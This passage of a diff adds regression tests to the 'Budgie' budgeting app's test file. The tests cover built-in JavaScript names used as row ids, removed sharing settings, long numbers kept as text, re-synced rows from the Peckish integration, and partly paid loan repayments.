+  ok("W6: so Ethan can still make them", !e.rejected.length && e.applied.length === 2, e.rejected);
+}
+
 // #5 the one-file backend (apps-script/Budgie.gs, made by migrate/build.js) must be built from the current files
 {
   const fs = require("fs"), path = require("path"), dir = path.join(__dirname, ".."), bundle = path.join(dir, "apps-script/Budgie.gs");
@@ -403,5 +715,76 @@ const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = (ops) => { const
     ok("#5 Budgie.gs is up to date (run node migrate/build.js)", !stale.length, stale);
   }
 }
+// ================= review 2026-10-27 (1.4.7) =================
+// P1: an id or an app called like a built-in JavaScript name ("constructor", "__proto__", "toString") is just a name:
+// it's never mistaken for a row that's already there, and isn't an app Budgie knows
+{
+  const F = fresh();
+  const r = F.call({key: F.kE, ops: [{op: "put", table: "splits", row: {id: "constructor", name: "Odd", shares: "ethan:1, sophie:1"}},
+    {op: "put", table: "splits", row: {id: "__proto__", name: "Odder", shares: "ethan:2, sophie:1"}},
+    {op: "put", table: "transactions", row: {id: "toString", date: "2026-10-28", person: "ethan", amount: 4, budget: "e-fun", account: "e-main", split: "__proto__"}}]});
+  ok("P1: rows with built-in names as ids are saved as new rows", r.applied.length === 3 && !r.rejected.length, r.rejected);
+  F.c.CACHE_ = {};
+  const sp = F.c.readTable_("splits").rows, tx = F.c.readTable_("transactions").rows;
+  ok("P1: and are in the sheet as ordinary rows", sp.some(x => x.id === "constructor" && x.name === "Odd") && sp.some(x => x.id === "__proto__" && x.name === "Odder") && tx.some(x => x.id === "toString"), sp.map(x => x.id));
+  ok("P1: nothing leaks into JavaScript's own objects", ({}).name === undefined && ({}).shares === undefined && Object.shares === undefined);
+  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-10-28");
+  near("P1: the engine reads a split called __proto__ like any other", B.between(L, "ethan", "2026-10-28").owedToMe, 4 / 3);
+  ok("P1: and an unknown id still isn't found", B.person(L, "hasOwnProperty").name === "hasOwnProperty" && B.accName(L, "toString") === "toString");
+  const a = F.call({key: F.kE, action: "app.link", app: "constructor"});
+  ok("P1: an app called constructor isn't one Budgie knows", a.ok === false && !a.link && !Object.keys(F.env.props).some(k => /constructor/.test(k)), a);
+}
+
+// P2: a sharing setting that's been taken off counts as off, as it does in the app and the engine
+{
+  const F = fresh(t => t.transactions.push({id: "s-own", date: "2026-10-27", person: "sophie", amount: 12, budget: "s-food", account: "s-main"}));
+  F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:share.payments", person: "sophie", key: "share.payments", value: "true"}}]});
+  const E = phone(F, F.kE); E.sync();
+  ok("P2: (shared while it's on)", E.T.transactions.some(x => x.id === "s-own"));
+  F.call({key: F.kS, ops: [{op: "delete", table: "settings", id: "sophie:share.payments"}]});
+  wait(5100); E.sync();
+  ok("P2: once Sophie's setting is taken off, her own payments leave Ethan's phone", !E.T.transactions.some(x => x.id === "s-own" && !x.deleted), E.T.transactions.filter(x => x.id === "s-own"));
+  ok("P2: and a full sync doesn't send them either", !F.call({key: F.kE, full: true}).rows.transactions.some(x => x.id === "s-own"));
+}
+
+// P3: a number with more than 15 digits (a long reference in a note) is kept as typed, not rounded by the sheet
+{
+  const F = fresh(), c = F.c;
+  ok("P3: 20 digits are kept as text", c.cell_("12345678901234567890") === "'12345678901234567890" && c.cell_("-1234567890123456.5") === "'-1234567890123456.5", [c.cell_("12345678901234567890"), c.cell_("-1234567890123456.5")]);
+  ok("P3: ordinary numbers are still numbers to the sheet", c.cell_("123456789012345") === "123456789012345" && c.cell_("12.5") === "12.5" && c.cell_("0.05") === "0.05" && c.cell_("-40") === "-40" && c.cell_(1234567890123456789) === 1234567890123456789);
+}
+
+// ================= review 2026-10-27b (1.4.8) =================
+// K1: Peckish sending its shop again (a name change, or its list catching up), for one the bank matched and you took
+// off in Budgie, isn't Peckish taking it off: it stays off, stays Peckish's, and its note isn't changed
+{
+  const F = fresh(), c = F.c;
+  const kP = JSON.parse(Buffer.from(c.appLink("ethan", "peckish").split("#connect=")[1], "base64url").toString()).k;
+  const shop = {id: "t-pk-k1", date: new Date().toISOString().slice(0, 10), person: "ethan", amount: 12, budget: "e-food-b", note: "Aldi (Peckish)", source: "peckish"};
+  F.call({key: kP, ops: [{op: "put", table: "transactions", row: shop}]});
+  c.CACHE_ = {}; c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "t-pk-k1", bankId: "monzo:tx_k1"}}, Date.now(), "bank", {sys: true}); c.CACHE_ = {};
+  F.call({key: F.kE, ops: [{op: "delete", table: "transactions", id: "t-pk-k1"}]});
+  const again = F.call({key: kP, ops: [{op: "put", table: "transactions", row: Object.assign({}, shop, {note: "Aldi big shop (Peckish)", deleted: false})}]});
+  c.CACHE_ = {}; const row = c.readTable_("transactions").rows.find(x => x.id === "t-pk-k1");
+  ok("K1: it stays off, and is still Peckish's, without a note saying Peckish took it off", again.applied.length === 1 && row.deleted === true && row.source === "peckish" && !/taken off in Peckish/.test(row.note) && row.review !== true, row);
+  ok("K1: Peckish really taking it off still works", F.call({key: kP, ops: [{op: "delete", table: "transactions", id: "t-pk-k1"}]}).applied.length === 1);
+}
+
+// ================= review 2026-10-27c (1.4.9) =================
+// L3: the rest of a repayment that was only partly paid under its own key (the monthly amount went up after it was
+// ticked) is saved when it's ticked, rather than taken for a copy of the first part
+{
+  const F = fresh(), key = "loan:sofa:2026-12-28";
+  F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-dec", date: "2026-12-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
+  F.call({key: F.kE, ops: [{op: "put", table: "loans", row: {id: "sofa", lender: "ethan", borrower: "sophie", name: "Sofa", amount: 600, date: "2026-10-25", repay: 250, repayFrom: "2026-12-28", repayDay: "28"}}]});
+  const r = F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-dec2", date: "2026-12-30", from: "sophie", to: "ethan", amount: 50, loan: "sofa", key}}]});
+  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-12-31"), l = B.loans(L, "ethan", "2026-12-31")[0];
+  ok("L3: the rest of a partly paid repayment counts", r.applied.length === 1 && !(F.c.readTable_("settlements").rows.find(x => x.id === "set-dec2") || {}).deleted, r);
+  ok("L3: so December's is paid and £350 is left", l.left === 350 && l.plan[0].date === "2027-01-28", l);
+  // and a second tick once it's all paid is still a copy
+  const r2 = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-dec3", date: "2026-12-31", from: "sophie", to: "ethan", amount: 50, loan: "sofa", key}}]});
+  ok("L3: ticking it again once it's paid is kept as a copy", r2.applied.length === 1 && (F.c.readTable_("settlements").rows.find(x => x.id === "set-dec3") || {}).deleted === true, r2);
+}
+
 console.log(fails ? fails + " failed, " + passes + " passed" : "All " + passes + " passed");
 process.exit(fails ? 1 : 0);
